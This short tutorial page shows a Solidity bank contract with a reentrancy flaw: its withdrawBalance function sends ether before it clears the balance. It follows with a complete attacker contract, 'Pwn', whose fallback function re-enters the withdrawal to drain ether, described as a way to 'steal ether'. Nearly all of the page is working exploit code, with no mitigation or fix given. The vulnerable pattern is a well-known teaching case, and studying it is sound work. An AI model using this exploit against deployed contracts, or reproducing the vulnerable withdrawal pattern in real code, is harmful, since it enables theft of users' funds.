# Exploiting bank smart-contract

We'll be exploiting vulnerable bank smart-contract running on Ethereum.
Here is the code of the bank

```
pragma solidity ^0.4.15;

contract Bank {
  mapping(address => uint) userBalances;
  uint public totalBankBalance;

  function Bank() public {
    totalBankBalance = 0;
  }

  function getUserBalance(address user) public view returns(uint) {
    return userBalances[user];
  }

  function addToBalance() public payable {
    userBalances[msg.sender] += msg.value;
    totalBankBalance += msg.value;
  }

  function withdrawBalance() public {
    var amountToWithdraw = userBalances[msg.sender];
    if (amountToWithdraw == 0) return;

    require(msg.sender.call.value(amountToWithdraw)());
    totalBankBalance -= userBalances[msg.sender];
    userBalances[msg.sender] = 0;
  }
}

```

And here is exploit that will help us steal ether

```
pragma solidity ^0.4.15;

import "./Bank.sol";

contract Pwn {
  Bank public bank;
  bool public performAttack = false;

  function setBank(address _bank) public {
    bank = Bank(_bank);
  }

  function steal() public payable {
    bank.addToBalance.value(msg.value)();
    performAttack = true;
    bank.withdrawBalance();
  }

  function getJackpot() public {
    msg.sender.transfer(this.balance);
  }

  function () public payable {
    if (performAttack) {
      performAttack = false;
      bank.withdrawBalance();
    }
  }
}
```
